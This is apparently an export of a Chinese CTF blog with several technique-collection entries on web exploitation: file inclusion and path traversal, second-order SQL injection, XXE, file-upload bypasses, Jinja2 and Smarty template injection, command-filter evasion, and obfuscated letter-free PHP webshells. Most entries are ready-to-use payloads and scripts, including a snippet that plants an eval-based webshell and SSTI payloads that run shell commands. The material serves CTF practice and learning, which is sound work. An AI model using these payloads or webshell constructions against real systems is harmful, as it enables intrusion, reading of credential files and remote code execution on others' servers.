    <content type="text"><![CDATA[前言 本篇文章专门用于记录做文件包含类题目的做题姿势，会不断更新。 LFI：Local File Inclusion，本地文件包含漏洞，大部分情况下遇到的文件包含漏洞都是LFI RFI：Remote File Inclusion，远程文件包含漏洞，要求allow_url_fopen=On(默认为On) ，规定是否允许从远程服务器或者网站检索数据；allow_url_include=On(php5.2之后默认为Off) ，规定是否允许include/require远程文件 php常见文件包含函数12345include()：遇到错误生成警告，继续执行脚本require()：遇到错误生成致命错误，脚本继续include_once()：如果文件已包含，则不再进行包含，一定程度避免错误require()_once()：如果文件已包含，则不再进行包含，一定程度避免错误fopen()，file_get_contents()等：文件读取函数 文件包含漏洞的利用php伪协议php://input（allow_url_include=On） 遇到file_get_contents()要想到用php://input绕过 123构造?file=php://inputpost data中输入：&lt;?php system(&apos;dir&apos;);?&gt; //代码表示显示所有文件目录根据显示的文件目录直接进行访问（某txt或php文件），得到flag php://filter 可以使用的函数：readfile()、file()、file_get_contents()、include() 1?file=php://filter/read=convert.base64-encode/resource=index.php data:// 要求allow_url_fopen=On，allow_url_include=On 1234?file=data://text/plain,&lt;?php phpinfo()?&gt; //执行phpinfo()?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= //将命令进行base64加密，编码为“&lt;?php phpinfo()?&gt; ”的base64编码?file=data:text/plain,&lt;?php phpinfo()?&gt; //去掉双斜杠?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= zip:// zip:// 可以访问压缩包里面的文件。zip://中只能传入绝对路径；要用#分隔压缩包和压缩包里的内容，且#要用url编码%23代替 1?file=zip://D:\file.zip%23flag.txt D:\file.zip表示压缩包的绝对路径 后跟%23分割压缩包和压缩包中要访问的文件名 phar:// 类似zip://，相对路径和绝对路径都可以使用，不管后缀名是什么都会将文件当作压缩包解压 12?file=phar://D:\file.zip\flag.txt //绝对路径?file=phar://file.zip\flag.txt //相对路径 包含日志文件日志和配置文件默认存放路径123apache+Linux日志默认路径 /etc/httpd/logs/access_log/var/log/httpd/access_log 123apache+win2003日志默认路径 D:\xampp\apache\logs\access.logD:\xampp\apache\logs\error.log 12IIS6.0+win2003默认日志文件 C:\WINDOWS\system32\Logfiles 1IIS7.0+win2003 默认日志文件 %SystemDrive%\inetpub\logs\LogFiles 1234nginx 日志文件 用户安装目录logs目录下（/usr/local/nginx/logs） /var/log/nginx/access.log/var/log/nginx/error.log 123apache+linux 默认配置文件 /etc/httpd/conf/httpd.confindex.php?page=/etc/init.d/httpd 1IIS6.0+win2003 配置文件 C:/Windows/system32/inetsrv/metabase.xml 12IIS7.0+WIN 配置文件 C:\Windows\System32\inetsrv\config\applicationHost.config session常见存储路径 php的session文件的保存路径可以在phpinfo的session.save_path看到，session文件格式： sess_[phpsessid] ，phpsessid在发送的请求的 cookie 字段中可以看到 1234/var/lib/php/sess_PHPSESSID/var/lib/php/sess_PHPSESSID/tmp/sess_PHPSESSID/tmp/sessions/sess_PHPSESSID 包含系统文件包含 /pros/self/environ 条件 php以cgi方式运行，这样environ才会保持UA头。 environ文件存储位置已知，且environ文件可读。 proc/self/environ中会保存user-agent头，如果在user-agent中插入php代码，则php代码会被写入到environ中，之后再包含它，即可。 绕过过滤read、resource1234?f=php://filter/convert.base64-encode/resource=login.php（过滤了操作名read）绕过方式：?f=data:text/plain,&lt;?php phpinfo()?&gt;?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 1?f=php://filter/read=convert.base64-encode/resource=1.jpg/resource=./show.php（正则 /resource=*.jpg/i） 过滤 ../利用url编码 ../ %2e%2e%2f ..%2f %2e%2e/ ..\ %2e%2e%5c ..%5c %2e%2e\ 二次编码 ../ %252e%252e%252f ..\ %252e%252e%255c 容器/服务器的编码方式 ../ ..%c0%af %c0%ae%c0%ae/ java中会把”%c0%ae”解析为”\uC0AE”，最后转义为ASCCII字符的”.”（点 ..\ ..%c1%9c 截断包含要求 php版本小于5.3.4 magic_quotes_gpc=off 原理 Windows下目录最大长度为256字节，超出的部分会被丢弃 Linux下目录最大长度为4096字节，超出的部分会被丢弃。 123&lt;?php include(“includes/” . $_GET[&apos;file&apos;]); ?&gt; 123&lt;?php include(“includes/” . $_GET['file'] . “.htm”); ?&gt; url绕过 12?file=http://localhost:8081/phpinfo.php?拼接后：?file=http://localhost:8081/phpinfo.php?.txt 12?file=http://localhost:8081/phpinfo.php%23拼接后：?file=http://localhost:8081/phpinfo.php#.txt %00截断包含 1?p=../hanguo/test.php%00 列目录 条件：magic_quotes_gpc=off 1?file=../../../../../../../../../var/www/accounts/%00 路径遍历 1?file=../../../../../../../../../var/lib/locate.db 路径截断 1?file=../../../../../../../../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././ 点号截断（windows下） 1?file=../../../../../../../../../etc/passwd……………. … 利用phar://协议绕过waf检测 版本要求：php 5.3.0 起利用php伪协议读取php文件内容 1234data要求：php5.2以后allow_url_fopen ：onallow_url_include：on poc 1data:text/plain,&lt;?php phpinfo();?&gt;%00data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= php://filte 1234要求：需要开启allow_url_includepocphp://filter/read=convert.base64-encode/resource=upload.php 远程文件包含要求：allow_url_fopen：on 长度截断利用条件： php版本 &lt; php 5.2.8 使用截断包含 绕过拼接后缀名00截断%00 长目录名截断windows下 最大长度为256Linux下最大为4096子节，超出部分会被丢弃 phar://(php&gt;5.3.0起)phar://支持zip、phar格式的压缩（归档）文件，无视后缀（也就是说jpg后缀照样给你解开来），?file=phar://压缩包路径/压缩包内文件名，绝对路径和相对路径都行。 利用方法：index.php?file=phar://test.zip/test.txtindex.php?file=phar://test.xxx/test.txt 制作phar文件（php5.3之后） 设置php.ini中phar.readonly=off 制作生成脚本 123456789&lt;?php @unlink(&quot;phar.phar&quot;); $phar = new Phar(&quot;phar.phar&quot;); $phar-&gt;startBuffering(); $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;&lt;?php phpinfo();?&gt;&quot;); //添加要压缩的文件及内容 $phar-&gt;stopBuffering(); //签名自动计算?&gt;// 这个脚本需要使用php.exe 来生成 生成脚本2 1234&lt;?php $p = new PharData(dirname(__FILE__).&apos;./test.123&apos;, 0,&apos;test&apos;,Phar::ZIP); $p-&gt;addFromString(&apos;test.txt&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;);?&gt;]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[BUUCTF-WEB [网鼎杯2018]Unfinish 1]]></title>
    <url>%2F2021%2F10%2F22%2F%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DUnfinish%201%2F</url>
    <content type="text"><![CDATA[考点二次注入 解题脚本1234567891011121314151617181920212223242526272829import requests,reflag_hex = ''# email=a9%40qq.com&amp;username='%2bsubstr((hex(hex((select * from flag))))from 1 for 10)%2b'&amp;password=1url_reg = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/register.php"url_login = "http://024137a8-4186-4739-8cd8-41f6374a9248.node4.buuoj.cn:81/login.php"for i in range(100): reg_data = &#123; 'email': 'b%d@qq.com'%(i), 'username': "'+substr((hex(hex((select * from flag))))from %d for 10)+'"%(i*10+1), 'password': '1' &#125; requests.post(url=url_reg, data=reg_data) data_login = &#123; 'email': 'b%d@qq.com'%(i), 'password': '1' &#125; res = requests.post(url=url_login, data=data_login) res = re.findall(r'&lt;span class="user-name"&gt;(.*?)&lt;/span&gt;', res.text,re.S)[0].strip() print(res) if res == '0': break flag_hex +=res print(flag_hex) 得到的结果再进行两次hex解码就能得到flag。]]></content>
      <categories>
        <category>CTF</category>
        <category>BUUCTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>二次注入</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【XXE】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90XXE%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做XXE类题目的做题姿势，会不断更新。 XXE（外部实体注入）就是引入外部的xml文件来进行利用 Payload一个读取flag 的payload12345&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ELEMENT name ANY &gt;&lt;!ENTITY penson SYSTEM &quot;file:///flag&quot; &gt;]&gt;&lt;user&gt;&lt;username&gt;&amp;penson;&lt;/username&gt;&lt;password&gt;penson&lt;/password&gt;&lt;/user&gt; 报错原因Warning：DOMDocument::loadXML(): XML declaration allowed only at the start of the document in Entity,传入的xml语句中前面包含空格]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【文件上传】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做文件上传类题目的做题姿势，会不断更新。 文件上传可解析后缀asp/aspx 1asp,aspx,asa,asax,ascx,ashx,asmx,cer,aSp,aSpx,aSa,aSax,aScx,aShx,aSmx,cEr php 1php,php5,php4,php3,php2,pHp,pHp5,pHp4,pHp3,pHp2,html,htm,phtml,pht,Html,Htm,pHtml jsp 1jsp,jspa,jspx,jsw,jsv,jspf,jtml,jSp,jSpx,jSpa,jSw,jSv,jSpf,jHtml 中间件解析漏洞iis 1234561.IIS6.0文件解析xx.asp;.jpg（服务器默认不解析;号后面的内容，因此xx.asp;.jpg便被解析成asp文件了）2.IIS6.0目录解析xx.asp/1.jpg (服务器默认会把.asp，.asa目录下的文件都解析成asp文件。)3.IIS 7.0畸形解析 xxx.jpg/x.asp apache 1234561.%0a(CVE-2017-15715)（apache 2.4.0 - 2.4.29）更多姿势https://www.leavesongs.com/PENETRATION/apache-cve-2017-15715-vulnerability.html2.未知后缀 test.php.xxx（Apache 解析文件的规则是从右到左开始判断解析,如果后缀名为不可识别文件解析,就再往左判断） nginx 123456789101112131415访问连接加/xxx.php test.jpg/.php (跟版本没有关系 属于配置不当)畸形解析漏洞 test.jpg%00.phpCVE-2013-4547（Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7）test.jpg(非编码空格)\0x.php www.xxxx.com/UploadFiles/image/1.jpg/1.phpwww.xxxx.com/UploadFiles/image/1.jpg%00.phpwww.xxxx.com/UploadFiles/image/1.jpg/%20\0.php另外一种手法：上传一个名字为test.jpg，以下内容的文件。&lt;?PHPfputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?phpeval($_POST[cmd])?&gt;&apos;);?&gt;然后访问test.jpg/.php,在这个目录下就会生成一句话木马shell.php。 tomcat（仅限windows） 12345xxx.jsp/xxx.jsp%20xxx.jsp::$DATA 绕过 xif_imagetype()方式添加gif文件头 GIF89a 截断上传漏洞%00截断上传 php版本&lt;5.3.4 windows系统解析漏洞绕过1、上传1.php(或者图片马)，抓包改为1.php. 2、上传1.php(或者图片马)，抓包改为1.php::$DATA 3、上传1.php(或者图片马)，抓包改为1.php:1.jpg 4、上传1.php(或者图片马)，抓包改为1.php::$DATA……. 小技巧 利用.user.ini文件进行上传前提是当前上传的目录存在php文件 上传.htaccess (Apache) 更多 https://websec.readthedocs.io/zh/latest/vuln/fileupload.html]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【模板注入】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做模板注入类题目的做题姿势，会不断更新。 jinja2函数和属性123456__class__ 返回调用的参数类型__bases__ 返回基类列表__mro__ 此属性是在方法解析期间寻找基类时的参考类元组__subclasses__() 返回子类的列表__globals__ 以字典的形式返回函数所在的全局命名空间所定义的全局变量__builtins__ 内建模块的引用，在任何地方都是可见的(包括全局)，每个python脚本都会自动加载。 读取文件payload1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('文件名/文件路径','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].open('文件名/文件路径','r').read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 查看指定路径下所有文件1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123;c.__init__.__globals__['__builtins__']['__import__']('os').listdir('/')&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; 1&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__=='catch_warnings' %&#125;&#123;&#123; c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125; Smarty执行命令1&#123;system(&apos;ls /&apos;)&#125; 查看smarty版本号1&#123;$smarty.version&#125;]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【命令执行和代码执行】漏洞做题姿势积累]]></title>
    <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E3%80%91%E6%BC%8F%E6%B4%9E%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做命令执行和代码执行类题目的做题姿势，会不断更新。 php中的会造成代码执行函数1234evalassert` (反引号)... php中的会造成命令执行函数12345678execshell_execsystempassthru... 命令执行函数搜索flag文件命令 1find / -name flag* php搜索文件函数 12print_r(glob(&quot;flag*&quot;))// 因为返回是一个数组 只能用print_r 或者 var_dump输出 过滤命令执行 空格被过滤1234567 $&#123;IFS&#125;$&#123;IFS&#125;$9$IFS$9重定向符&lt;&gt;&lt;&gt;&lt;编码%09 ctf中常用php函数1get_defined_vars() // 返回由所有已定义变量所组成的数组 Linux查看文件内容的命令123456cattacmorelessheadtail 绕过 preg_match的方式 换行绕过 PCRE回溯绕过 数组绕过 编码绕过（8进制、16进制） 未过滤函数绕过 PHP开启short_open_tag=on，即可使用短标签]]></content>
      <categories>
        <category>CTF</category>
        <category>CTF做题姿势总结</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF-Web【代码审计】做题姿势积累]]></title>
    <url>%2F2021%2F10%2F22%2FCTF-Web%E3%80%90%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E3%80%91%E5%81%9A%E9%A2%98%E5%A7%BF%E5%8A%BF%E7%A7%AF%E7%B4%AF%2F</url>
    <content type="text"><![CDATA[前言 本篇文章专门用于记录做代码审计类题目的做题姿势，会不断更新。 案例来源于各大师傅们的博客和平时做题遇到。 phpinfo中的相关知识点disable_functions 禁用的系统函数 PHP开启short_open_tag=on，即可使用短标签 preg_match绕过1234if($_GET['b_u_p_t'] !== '23333' &amp;&amp; preg_match('/^23333$/', $_GET['b_u_p_t']))// 绕过方式：换行绕过// ?b_u_p_t=23333%0a 1234if (preg_match('/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/', $json)) &#123; echo 'Hacking attempt detected&lt;br/&gt;&lt;br/&gt;'; &#125;// PCRE回溯绕过 123456# PCRE回溯绕过利用脚本import requestsurl = "http://3f0c0ea0-47c8-4ae8-8f1c-dcd5c21ec12d.node3.buuoj.cn"payload = '&#123;"cmd": "/bin/cat /home/rceservice/flag", "zz": "'+"a"*(1000000)+'"&#125;'res = requests.post(url, data=&#123;"cmd": payload&#125;, timeout=10)print(res.text) md5、sha1绕过123if(md5($_POST['md51']) == md5($_POST['md52']) &amp;&amp; $_POST['md51'] != $_POST['md52'])// 绕过方式：数组绕过// md51[]=1&amp;md52[]=2 123456if((string)$_POST['param1']!==(string)$_POST['param2'] &amp;&amp; md5($_POST['param1'])===md5($_POST['param2']))&#123; die("success!");&#125;// 绕过payload// param1=1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02Sj%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3E%D6%D1mE%AAL4%E1%F2d%CD%E1%073c%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F_D%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%3C%F9%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%90%BC%B5%2F%ED&amp;param2=1%0A%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00+%F7%B9%9D%AB%97o%3F%E9%85%14%1E%A9%88%86%EDm%02S%EA%B1%85%92%5E%07%8E%82Z%97%BC%AD%10%22%C6%CB%D8%CC%8CG%E2%EB%FF%C89%3EV%D2mE%AAL4%E1%F2d%CD%E1%073%E3%04%DA6%1C%BFj%8B%C9%08U%17%22%9D%F3%C5ne%FA%A5%2B%A9%F7%8F%DFD%E22%D0%AD%B5+%CF%06%60%A8%C7%D3%FB%12T%AF%C2%914%B4B%0A%5C%2C%BC%F8%99P%ED%B0%8E%E4%C7%A8%C2%F6%D0%A6%10%BC%B5%2F%ED 12345678910111213141516$flag = "flag";if (isset($_GET['name']) and isset($_GET['password'])) &#123; if ($_GET['name'] == $_GET['password']) echo '&lt;p&gt;Your password can not be your name!&lt;/p&gt;'; else if (sha1($_GET['name']) === sha1($_GET['password'])) die('Flag: '.$flag); else echo '&lt;p&gt;Invalid password.&lt;/p&gt;';&#125;else echo '&lt;p&gt;Login first!&lt;/p&gt;';?&gt;# 绕过方式：数组绕过# ?name[]=1&amp;password[]=2 关键字过滤后绕过_ 的代替字符 [ 空格 的代替字符 ${IFS} ${IFS}$9 &lt; %09 混淆绕过 比如 cat 可以这样 c&quot;&quot;at json_decode特性 1可以接收Unicode编码后的字符 1234567$js = json_decode('&#123;"name": "\u0068\u0065\u006c\u006c\u006f"&#125;');print_r($js);//stdClass Object//(// [name] =&gt; hello//)// 有时候可以用来绕过正则匹配 basename缺陷 1文件名首尾任何非ASCII码的字符都会被rename函数删除掉 构造无字母webshell的三种方式1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; 在ctf中，我们一般遇到上面这种正则，不能传入字母和数字，是不是就不能执行webshell了呢，并不是，p神在他的博客中记录了三种方法，分别是异或、取反、自增。 异或如果我们要构造 phpinfo POST GET system 这类关键字，我们可以通过 两个没有被过滤的字符进行异或得到。 演示 1234567891011121314151617构造 phpinfo p:%FF^%8Fo:%FF^%90n:%FF^%91i:%FF^%96h:%FF^%97f:%FF^%99$_=%FF%FF%FF%FF%FF%FF%FF^%8F%97%8F%96%91%99%90;$_(); //$_=phpinfo;$_(); 成功执行phpinfo();在php5 可以用assert 函数 php7 不能php5 下$_=(&apos;%01&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%13&apos;^&apos;`&apos;).(&apos;%05&apos;^&apos;`&apos;).(&apos;%12&apos;^&apos;`&apos;).(&apos;%14&apos;^&apos;`&apos;);// assert$__=&apos;_&apos;.(&apos;%0D&apos;^&apos;]&apos;).(&apos;%2F&apos;^&apos;`&apos;).(&apos;%0E&apos;^&apos;]&apos;).(&apos;%09&apos;^&apos;]&apos;); //_POST$___=$$__; //$_POST$_($___[_]); //assert($_POST[_])POST _=phpinfo(); ![image-20210823153951769](F:\D-学习笔记\BUUCTF WP\image-20210823153951769.png) 生成脚本 python 123456789101112import urllib.parsefind = ['p','h','i','n','f','o']for i in range(1,256): for j in range(1,256): result = chr(i^j) if(result in find): a = i.to_bytes(1,byteorder='big') b = j.to_bytes(1,byteorder='big') a = urllib.parse.quote(a) b = urllib.parse.quote(b) print("%s:%s^%s"%(result,a,b)) php 12345678910111213141516171819$l = "";$r = "";$argv = str_split("_GET");for ($i = 0; $i &lt; count($argv); $i++) &#123; for ($j = 0; $j &lt; 255; $j++) &#123; $k = chr($j) ^ chr(255); // dechex(255) = ff if ($k == $argv[$i]) &#123; if ($j &lt; 16) &#123; $l .= "%ff"; $r .= "%0" . dechex($j); continue; &#125; $l .= "%ff"; $r .= "%" . dechex($j); continue; &#125; &#125;&#125;echo "\&#123;$l`$r\&#125;"; 取反参考 与异或类似，不过它利用的是 UTF-8 编码中的某个汉子 , 将其中的某个字符提取出来 , 进行取反后得到对应字符 生成步骤 找到 “p“ 对应的 ASCII码，拿到对应的十六进制编码 70 在前面添加两个十六进制数 . 这个数是任意的 . 然后将它取反 . 在线 比如这里用 7B，然后就行取反。 ![image-20210823160420273](F:\D-学习笔记\BUUCTF WP\image-20210823160420273.png) 将取反后的数字写成 NCR 格式( &amp;#x … ) , 并且将它转换为中文字符 在线 &amp;#x848f ![image-20210823160541639](F:\D-学习笔记\BUUCTF WP\image-20210823160541639.png) 带入代码测试 , 取第二个字符( 第一个字符是你任意添加的 ) , 即可得到需要的字符 示范 构建 phpinfo 进行测试 p h i n f o 对应的 十六进制编码 70 68 69 6e 66 6f 加入 7b 取反 原字符 十六进制 取反 转为字符 p 7b70 848F 蒏 h 7b68 8497 蒗 i 7b69 8496 蒖 n 7b6e 8491 蒑 f 7b66 8499 蒙 o 7b6f 8490 蒐 12345678910111213141516171819202122232425262728&lt;?php$_=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;'); //2$__='';$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒗";$__.=~($___&#123;$_&#125;);$___="蒏";$__.=~($___&#123;$_&#125;);$___="蒖";$__.=~($___&#123;$_&#125;);$___="蒑";$__.=~($___&#123;$_&#125;);$___="蒙";$__.=~($___&#123;$_&#125;);$___="蒐";$__.=~($___&#123;$_&#125;);// phpinfo();$__();p神的例子 $__=('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;');$_=$__/$__;$____='';$___="瞰";$____.=~($___&#123;$_&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="和";$____.=~($___&#123;$__&#125;);$___="的";$____.=~($___&#123;$_&#125;);$___="半";$____.=~($___&#123;$_&#125;);$___="始";$____.=~($___&#123;$__&#125;);$_____='_';$___="俯";$_____.=~($___&#123;$__&#125;);$___="瞰";$_____.=~($___&#123;$__&#125;);$___="次";$_____.=~($___&#123;$_&#125;);$___="站";$_____.=~($___&#123;$_&#125;);$_=$$_____;$____($_[$__]);POST 2=phpinf(); ![image-20210824093035835](F:\D-学习笔记\BUUCTF WP\image-20210824093035835.png) 注意事项：这个写在php文件中能直接运行，通过GET传参就报错 eval()&#39;d code:1 Stack trace:，经过多次测试，需要进行url编码提交才不会报错。 递增运算得到对应字符这个就直接上代码，方式不一样，目的一样。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364p神案例 // ASSERT($_POST[_]); 这个仅支持 php5 php7 需要更换assert 为其他代码执行函数 &lt;?php $_=[];$_=@"$_"; // $_='Array';$_=$_['!'=='@']; // $_=$_[0];$___=$_; // A$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__; // S$___.=$__; // S$__=$_;$__++;$__++;$__++;$__++; // E $___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T$____.=$__;$_=$$____;$___($_[_]); POST _=phpinfo();// 自己构造的命令执行 (SYSTEM)($_POST[_]); 函数自调用 需要php7.0 以上&lt;?=$_=[]?&gt;&lt;?=$_="$_"?&gt;&lt;?=$_=$_['!'=='@']?&gt;&lt;?=$___=$_?&gt;&lt;?=$__=$_?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$_____=$__++?&gt;&lt;?=$__++?&gt;&lt;?=$______=$__++?&gt;&lt;?=$_______=$__++?&gt;&lt;?=$__++?&gt; 